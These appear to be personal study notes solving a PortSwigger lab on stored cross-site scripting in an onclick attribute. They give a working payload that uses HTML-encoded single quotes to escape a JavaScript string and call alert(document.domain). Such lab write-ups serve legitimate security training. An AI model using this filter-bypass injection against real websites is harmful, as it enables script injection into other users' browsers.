This lab contains a [stored cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.

# Vuln assessment

User input is placed within an `onclick` event:

![[relfection-point.png]]

# Exploitation

Try to manipulate the syntax:

```
http://test.com&apos;-alert(document.domain)-&apos;
```

URL encode the payload above and the result is the following:

![[Client-Side Vulnerabilities/XSS/Stored XSS/labs/Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped/images/XSS.png]]

The code inside is valid, hence once clicked the link will trigger the `alert` function:

```Javascript
var tracker={track(){}};tracker.track('http://test.com'-alert(document.domain)-'');
```

Specifically the argument:

```javascript
'http://test.com'-alert(document.domain)-''
```